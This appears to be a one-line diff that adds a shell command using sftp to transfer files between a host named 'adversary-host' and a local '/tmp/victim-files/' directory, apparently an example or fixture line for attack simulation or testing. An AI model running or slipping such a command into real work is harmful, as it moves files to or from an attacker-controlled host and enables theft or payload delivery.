@@ -1,0 +1,1 @@
+sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
